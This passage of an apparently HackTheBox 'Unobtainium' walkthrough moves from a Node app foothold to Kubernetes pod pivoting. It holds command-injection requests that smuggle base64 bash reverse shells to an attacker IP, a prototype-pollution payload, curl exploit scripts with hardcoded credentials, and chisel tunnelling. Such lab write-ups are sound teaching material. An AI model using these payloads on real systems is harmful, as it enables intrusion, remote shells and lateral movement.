+<p>The exploit write the content “lUc1f3r11” inside luci.txt.</p>
+<p>Now let’s run the exploit and capture the req in burp.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># ./exploit_stage2.sh</span></span><br></pre></td></tr></table></figure>
+
+<p>It’s said true. it’s means we should be able to read luci.txt and get the content lUc1f3r11 inside luci.txt.</p>
+<p>Just change filename to dedsec.txt for view the content inside that.</p>
+<p>request:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /todo HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: unobtainium.htb:31337</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">Content-Length: 73</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;auth&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;felamos&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;Winter2021&quot;</span>&#125;,<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;luci.txt&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>responese:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">X-Powered-By: Express</span><br><span class="line"></span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line"></span><br><span class="line">Content-Length: 35</span><br><span class="line"></span><br><span class="line">ETag: W/<span class="string">&quot;23-jxpbX4j3xXL3aDkAakKEYbVg4Rc&quot;</span></span><br><span class="line"></span><br><span class="line">Date: Fri, 23 Apr 2021 06:50:52 GMT</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;ok&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;content&quot;</span>:<span class="string">&quot;lUc1f3r11\n&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>And we see lUc1f3r11 inside luci.txt Now let’s try to get reverse shell through that.</p>
+<p>Just add the reverse shell inside filename.</p>
+<p>Before send req start your netcat listner.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /upload HTTP/1.1</span><br><span class="line">Host: unobtainium.htb:31337</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 151</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;auth&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;felamos&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;Winter2021&quot;</span>&#125;,<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;&amp; echo <span class="subst">$(echo &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.3/9001 0&gt;&amp;1&#x27; | base64)</span> | base64 -d | bash&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Let’s check the netcat listner.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># nc -lvp 9001</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9001</span><br><span class="line">Ncat: Listening on 0.0.0.0:9001</span><br><span class="line">Ncat: Connection from 10.10.10.235.</span><br><span class="line">Ncat: Connection from 10.10.10.235:57654.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@webapp-deployment-5d764566f4-h5zhw:/usr/src/app<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@webapp-deployment-5d764566f4-h5zhw:/usr/src/app<span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>Boom we got the shell.</p>
+<p>First Let’s get our user.txt inside &#x2F;root&#x2F;.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@webapp-deployment-5d764566f4-h5zhw:~<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">root@webapp-deployment-5d764566f4-h5zhw:~<span class="comment"># cat user.txt</span></span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">a6649836e48c4a2fef53804d75c1c1f3</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1930.jpg"></li>
+</ul>
+<h3 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h3><p>And if you notice we are root i think it’s a docker container.</p>
+<p>Anyway let’s run linpeas.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1931.jpg"></li>
+</ul>
+<p>there is a cronjob running that removes kubectl in the container every minute.</p>
+<p>But there is no kubectl executable in the container.</p>
+<p>Let’s download a kubectl executable and transfer it in docker inside &#x2F;tmp folder.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvdGFza3MvdG9vbHMvaW5zdGFsbC1rdWJlY3RsLWxpbnV4LyNpbnN0YWxsLWt1YmVjdGwtYmluYXJ5LXdpdGgtY3VybC1vbi1saW51eA==">Install and Set Up kubectl on Linux<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># curl -LO &quot;https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl&quot;</span></span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   154  100   154    0     0    107      0  0:00:01  0:00:01 --:--:--   107</span><br><span class="line">100 44.2M  100 44.2M    0     0  2972k      0  0:00:15  0:00:15 --:--:-- 3193k</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">Exploit.sh         kubectl  message.json  unobtainium_1.0.0_amd64.deb         unobtainium_debian.zip</span><br><span class="line">exploit_stage2.sh  luci.sh  stuff         unobtainium_1.0.0_amd64.deb.md5sum</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>
+
+<p>We change the name of kubectl to xkubectl to avoid being removed by the cron job.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@webapp-deployment-5d764566f4-h5zhw:/tmp<span class="comment"># wget http://10.10.14.3:8000/kubectl -o xkubectl</span></span><br><span class="line"></span><br><span class="line">root@webapp-deployment-5d764566f4-h5zhw:/tmp<span class="comment"># ls -la</span></span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 45364</span><br><span class="line">drwxrwxrwt 1 root root     4096 Apr 23 07:25 .</span><br><span class="line">drwxr-xr-x 1 root root     4096 Apr 22 19:28 ..</span><br><span class="line">drwxr-xr-x 3 root root     4096 Feb 21 22:43 v8-compile-cache-0</span><br><span class="line">-rw-r--r-- 1 root root 46436352 Apr 23 07:10 xkubectl</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s first check the version of kubectl.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@webapp-deployment-5d764566f4-h5zhw:/tmp<span class="comment"># ./xkubectl version --short</span></span><br><span class="line">./xkubectl version --short</span><br><span class="line">Client Version: v1.21.0</span><br><span class="line">Server Version: v1.20.0</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s see current rights with kubectl with privileged resources like secrets.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@webapp-deployment-5d764566f4-h5zhw:/tmp<span class="comment"># ./xkubectl auth can-i list secrets</span></span><br><span class="line">&lt;66f4-h5zhw:/tmp<span class="comment"># ./xkubectl auth can-i list secrets</span></span><br><span class="line">no</span><br></pre></td></tr></table></figure>
+
+<p>let’s check about namespaces.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@webapp-deployment-5d764566f4-h5zhw:/tmp<span class="comment"># ./xkubectl auth can-i list namespaces</span></span><br><span class="line">&lt;4-h5zhw:/tmp<span class="comment"># ./xkubectl auth can-i list namespaces</span></span><br><span class="line">Warning: resource <span class="string">&#x27;namespaces&#x27;</span> is not namespace scoped</span><br><span class="line"><span class="built_in">yes</span></span><br></pre></td></tr></table></figure>
+
+<p>Let’s list all the namespaces.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@webapp-deployment-5d764566f4-h5zhw:/tmp<span class="comment"># ./xkubectl get namespace</span></span><br><span class="line">./xkubectl get namespace</span><br><span class="line">NAME              STATUS   AGE</span><br><span class="line">default           Active   96d</span><br><span class="line">dev               Active   95d</span><br><span class="line">kube-node-lease   Active   96d</span><br><span class="line">kube-public       Active   96d</span><br><span class="line">kube-system       Active   96d</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@webapp-deployment-5d764566f4-h5zhw:/tmp<span class="comment"># ./xkubectl auth can-i list secrets -n dev</span></span><br><span class="line">&lt;zhw:/tmp<span class="comment"># ./xkubectl auth can-i list secrets -n dev</span></span><br><span class="line">no</span><br><span class="line">root@webapp-deployment-5d764566f4-h5zhw:/tmp<span class="comment"># ./xkubectl auth can-i list secrets -n kube-system</span></span><br><span class="line">&lt;<span class="comment"># ./xkubectl auth can-i list secrets -n kube-system</span></span><br><span class="line">no</span><br></pre></td></tr></table></figure>
+
+<p>We don’t have permission of any namespaces.</p>
+<p>Let’s check if we have permission of pods or not in the dev namespaces.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@webapp-deployment-5d764566f4-h5zhw:/tmp<span class="comment"># ./xkubectl auth can-i list pods -n dev</span></span><br><span class="line">&lt;-h5zhw:/tmp<span class="comment"># ./xkubectl auth can-i list pods -n dev</span></span><br><span class="line"><span class="built_in">yes</span></span><br><span class="line">root@webapp-deployment-5d764566f4-h5zhw:/tmp<span class="comment"># </span></span><br><span class="line">./xkubectl get pods -n dev</span><br><span class="line">NAME                                READY   STATUS    RESTARTS   AGE</span><br><span class="line">devnode-deployment-cd86fb5c-6ms8d   1/1     Running   28         95d</span><br><span class="line">devnode-deployment-cd86fb5c-mvrfz   1/1     Running   29         95d</span><br><span class="line">devnode-deployment-cd86fb5c-qlxww   1/1     Running   29         95d</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvY29uY2VwdHMvd29ya2xvYWRzL3BvZHMv">Pods<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>A Kubernetes cluster can have one or more nodes. Each node can have one or more Pods. Each Pod can have one or more running containers.</p>
+<p>And we see in the previous command there is three Pods each with a running container in the dev namespace.</p>
+<p>Let’s list the description of one of the Pods.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">root@webapp-deployment-5d764566f4-h5zhw:/tmp<span class="comment"># .//xkubectl describe pod/devnode-deployment-cd86fb5c-6ms8d -n dev</span></span><br><span class="line">&lt;scribe pod/devnode-deployment-cd86fb5c-6ms8d -n dev</span><br><span class="line">Name:         devnode-deployment-cd86fb5c-6ms8d</span><br><span class="line">Namespace:    dev</span><br><span class="line">Priority:     0</span><br><span class="line">Node:         unobtainium/10.10.10.235</span><br><span class="line">Start Time:   Sun, 17 Jan 2021 18:16:21 +0000</span><br><span class="line">Labels:       app=devnode</span><br><span class="line">              pod-template-hash=cd86fb5c</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">Status:       Running</span><br><span class="line">IP:           172.17.0.5</span><br><span class="line">IPs:</span><br><span class="line">  IP:           172.17.0.5</span><br><span class="line">Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c</span><br><span class="line">Containers:</span><br><span class="line">  devnode:</span><br><span class="line">    Container ID:   docker://bf852df0b8a7e049a21983112b178bfd65a3e27180c7463b441a7de2aeb1aedb</span><br><span class="line">    Image:          localhost:5000/node_server</span><br><span class="line">    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c</span><br><span class="line">    Port:           3000/TCP</span><br><span class="line">    Host Port:      0/TCP</span><br><span class="line">    State:          Running</span><br><span class="line">      Started:      Thu, 22 Apr 2021 19:28:37 +0000</span><br><span class="line">    Last State:     Terminated</span><br><span class="line">      Reason:       Error</span><br><span class="line">      Exit Code:    137</span><br><span class="line">      Started:      Wed, 24 Mar 2021 16:01:28 +0000</span><br><span class="line">      Finished:     Wed, 24 Mar 2021 16:02:13 +0000</span><br><span class="line">    Ready:          True</span><br><span class="line">    Restart Count:  28</span><br><span class="line">    Environment:    &lt;none&gt;</span><br><span class="line">    Mounts:</span><br><span class="line">      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)</span><br><span class="line">Conditions:</span><br><span class="line">  Type              Status</span><br><span class="line">  Initialized       True </span><br><span class="line">  Ready             True </span><br><span class="line">  ContainersReady   True </span><br><span class="line">  PodScheduled      True </span><br><span class="line">Volumes:</span><br><span class="line">  default-token-rmcd6:</span><br><span class="line">    Type:        Secret (a volume populated by a Secret)</span><br><span class="line">    SecretName:  default-token-rmcd6</span><br><span class="line">    Optional:    <span class="literal">false</span></span><br><span class="line">QoS Class:       BestEffort</span><br><span class="line">Node-Selectors:  &lt;none&gt;</span><br><span class="line">Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists <span class="keyword">for</span> 300s</span><br><span class="line">                 node.kubernetes.io/unreachable:NoExecute op=Exists <span class="keyword">for</span> 300s</span><br><span class="line">Events:          &lt;none&gt;</span><br></pre></td></tr></table></figure>
+
+<p>If you notice the difference i am in a webapp-deployment container enumerating devnode-deployment containers in Pods running in the dev namespace.</p>
+<p>We are looking at two different environments, the classic production environment and the development environment. I should be able to repeat the steps i just have to make the RHOST and RPORT variables and upload them to the container I’m currently in above to get another foothold in the development environment.</p>
+<p>For that we need to forward the port to the devnode-deployment container “172.17.0.5:3000”</p>
+<p>I am using Chisel for that.</p>
+<p>If you don’t known how to use chisel or how to download it check this out.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1ZcDRveG9RSUJBTSZ0PTE0Njlz">chisel<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>First i run chisel in my kali linux to open a server.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># ./chisel server -p 9999 --reverse</span></span><br><span class="line">2021/04/23 04:10:20 server: Reverse tunnelling enabled</span><br><span class="line">2021/04/23 04:10:20 server: Fingerprint 2a:06:15:bf:71:4e:28:c7:fe:4e:bc:35:24:70:cb:09</span><br><span class="line">2021/04/23 04:10:20 server: Listening on http://0.0.0.0:9999</span><br></pre></td></tr></table></figure>
+
+<p>Now transfer the chisel in box and and execute as client.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@webapp-deployment-5d764566f4-h5zhw:/tmp<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">chisel</span><br><span class="line">v8-compile-cache-0</span><br><span class="line">xkubectl</span><br><span class="line">root@webapp-deployment-5d764566f4-h5zhw:/tmp<span class="comment"># chmod +x chisel</span></span><br><span class="line"><span class="built_in">chmod</span> +x chisel</span><br><span class="line">root@webapp-deployment-5d764566f4-h5zhw:/tmp<span class="comment"># ./chisel client 10.10.14.3:9999 R:3000:172.17.0.5:3000</span></span><br><span class="line">&lt;hisel client 10.10.14.3:9999 R:3000:172.17.0.5:3000</span><br><span class="line">2021/04/23 08:14:50 client: Connecting to ws://10.10.14.3:9999</span><br><span class="line">2021/04/23 08:14:52 client: Fingerprint 2a:06:15:bf:71:4e:28:c7:fe:4e:bc:35:24:70:cb:09</span><br><span class="line">2021/04/23 08:14:55 client: Connected (Latency 653.764518ms)</span><br></pre></td></tr></table></figure>
+
+<p>Now we are connected let’s give us permission for canDelete and canUpload.</p>
+<p>I again made the script for give permissions devnode-deployment container.</p>
+<ul>
+<li>read_write.sh</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">RHOST=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">RPORT=3000</span><br><span class="line">UA=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span></span><br><span class="line">PROXY=<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">TEXT=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> - &lt;&lt;<span class="string">EOF &gt; message.json</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;auth&quot;:</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        &quot;name&quot;:&quot;felamos&quot;,</span></span><br><span class="line"><span class="string">        &quot;password&quot;:&quot;Winter2021&quot;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &quot;message&quot;:</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        &quot;text&quot;:$&#123;TEXT&#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">curl -s \</span><br><span class="line">     -X PUT \</span><br><span class="line">     -A <span class="string">&quot;<span class="variable">$&#123;UA&#125;</span>&quot;</span> \</span><br><span class="line">     -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">     -d <span class="string">&quot;<span class="subst">$(cat message.json | jq -c)</span>&quot;</span> \</span><br><span class="line">     -x <span class="string">&quot;<span class="variable">$&#123;PROXY&#125;</span>&quot;</span> \</span><br><span class="line">     <span class="string">&quot;http://<span class="variable">$&#123;RHOST&#125;</span>:<span class="variable">$&#123;RPORT&#125;</span>/&quot;</span> \</span><br><span class="line">| jq .</span><br></pre></td></tr></table></figure>
+
+<p>Imp -&gt; before running the exploit intercept the request and forward the req becuase we use proxy inside exploit.</p>
+<p>Now we all set let’s run the exploit.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># ./read_write.sh &#x27;&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;canDelete&quot;:true, &quot;canUpload&quot;:true&#125;&#125;&#125;&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;ok&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>For reverse shell i create another script.</p>
+<ul>
+<li>rev.sh</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">RHOST=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">RPORT=3000</span><br><span class="line">UA=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span></span><br><span class="line">PROXY=<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">FILE=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> - &lt;&lt;<span class="string">EOF &gt; message.json</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;auth&quot;:</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        &quot;name&quot;:&quot;felamos&quot;,</span></span><br><span class="line"><span class="string">        &quot;password&quot;:&quot;Winter2021&quot;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &quot;filename&quot;:&quot;$&#123;FILE&#125;&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">curl -s \</span><br><span class="line">     -A <span class="string">&quot;<span class="variable">$&#123;UA&#125;</span>&quot;</span> \</span><br><span class="line">     -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">     -d <span class="string">&quot;<span class="subst">$(cat message.json | jq -c)</span>&quot;</span> \</span><br><span class="line">     -x <span class="string">&quot;<span class="variable">$&#123;PROXY&#125;</span>&quot;</span> \</span><br><span class="line">     -o /dev/null \</span><br><span class="line">     <span class="string">&quot;http://<span class="variable">$&#123;RHOST&#125;</span>:<span class="variable">$&#123;RPORT&#125;</span>/upload&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Now let’s get our reverse shell with devnode-deployment.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># chmod +x rev.sh</span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># ./rev.sh &quot;&amp; echo $(echo &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.3/9002 0&gt;&amp;1&#x27; | base64) | base64 -d | bash&quot;</span></span><br></pre></td></tr></table></figure>
+
